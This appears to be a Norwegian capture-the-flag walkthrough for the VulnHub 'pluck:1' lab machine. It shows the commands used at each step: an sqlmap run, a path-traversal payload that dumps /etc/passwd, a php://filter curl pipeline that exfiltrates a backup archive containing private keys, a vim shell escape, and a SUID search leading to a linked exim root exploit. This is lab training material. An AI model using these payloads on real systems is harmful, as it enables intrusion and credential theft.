### pluck:1 - written by chris

[https://www.vulnhub.com/entry/pluck-1,178/](https://www.vulnhub.com/entry/pluck-1,178/)

* `22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)`

* `80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))`

* `3306/tcp open  mysql   MySQL (unauthorized)`

* `5355/tcp open  llmnr?`

* apache versjon og kernel er ikke sårbare

* fant nettside med /admin.php. kanskje inn der?

* ser at mysql kjører
* kjører ikke wordpress ser det ut som
* ingen robots.txt
* fant en rubber ducky i /images

* `sqlmap -uhttp://10.0.0.10/admin.php--forms –-batch –-crawl=10–-level=5 –-risk=3 –-dbs` tester sql stuff. greide ikke injecte noe

* fant ingen morsomme dirs med dirbuster

* tipper at det er sql injection som må til
* prøvde med `' = 1` og fikk `You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 6.`
* kanskje passord eller email er på linje 6?

`http://10.0.0.10/index.php?page=../../../../../../../../etc/passwd`** tester php-triks og hurra fant filen.**

`root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:109::/var/run/dbus:/bin/false mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false lxd:x:108:65534::/var/lib/lxd/:/bin/false uuidd:x:109:114::/run/uuidd:/bin/false dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin pollinate:x:112:1::/var/cache/pollinate:/bin/false bob:x:1000:1000:bob,,,:/home/bob:/bin/bash Debian-exim:x:113:119::/var/spool/exim4:/bin/false peter:x:1001:1001:,,,:/home/peter:/bin/bash paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh`

ser at det ligger et backup-script for å gjøre backuper enklere?

navigerer til det

`#!/bin/bash ######################## # Server Backup script # ######################## #Backup directories in /backups so we can get it via tftp echo "Backing up data" tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null echo "Backup complete"`

backuper alle web dirs og tarer? la oss laste ned den og se om vi finner noe gøy da?

fant private keys. prøvde ssh med alle men ingen hell. **\(gjorde feil her. hadde gamle filer liggende. dette ville funket\)**

prøve å laste ned backupfilen ordentlig

`curl http://10.0.0.10/index.php?page=php://filter/convert.base64-encode/resource=/backups/backup.tar | grep 'jumbotron > ' | cut -d ' > ' -f 2 | cut -d ' < ' -f 1 > backup.tar64`

```
base64 -d backup.tar64 > backup.tar
```

```
mkdir backup ; tar -xvf backup.tar -C backup
```

må encode til base64

gå til edit file, åpne vim og spawne shell med `:set shell=/bin/bash` og så `:shell`

fant ingen kernel exploits

`find / -perm -u=s -type f 2>/dev/null` ga en exim-fil.

fant en exploit tilhørende exim 4.83 [https://www.exploit-db.com/exploits/39535/](https://www.exploit-db.com/exploits/39535/)

**whoami root**

